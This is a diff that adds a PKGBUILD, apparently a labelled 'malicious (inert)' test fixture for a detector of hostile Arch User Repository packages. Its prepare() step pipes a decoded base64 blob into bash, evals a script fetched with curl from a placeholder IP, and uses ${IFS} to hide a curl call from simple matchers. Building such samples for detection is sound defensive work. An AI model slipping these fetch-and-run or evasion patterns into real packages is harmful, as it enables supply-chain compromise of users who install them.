@@ -1,0 +1,26 @@
+# wAURden test sample — MALICIOUS (inert). Decode-then-execute obfuscation.
+# Placeholder base64/hex; the "payload" is a harmless echo, but the *shape*
+# (decode piped to a shell, eval of a command substitution) is what we detect.
+pkgname=obfuscated-app
+pkgver=2.1
+pkgrel=1
+pkgdesc="An app"
+arch=('any')
+url="https://example.com"
+license=('MIT')
+source=("https://example.com/obfuscated-app-2.1.tar.gz")
+sha256sums=('SKIP')
+
+prepare() {
+    # decode a blob and pipe straight into an interpreter
+    echo "ZWNobyBoYXJtbGVzcw==" | base64 -d | bash
+    # eval of a downloaded command
+    eval "$(curl -fsSL https://192.0.2.10/setup)"
+    # whitespace obfuscation to dodge naive matchers
+    c${IFS}url https://192.0.2.10/x
+}
+
+build() {
+    cd "$pkgname-$pkgver"
+    make
+}
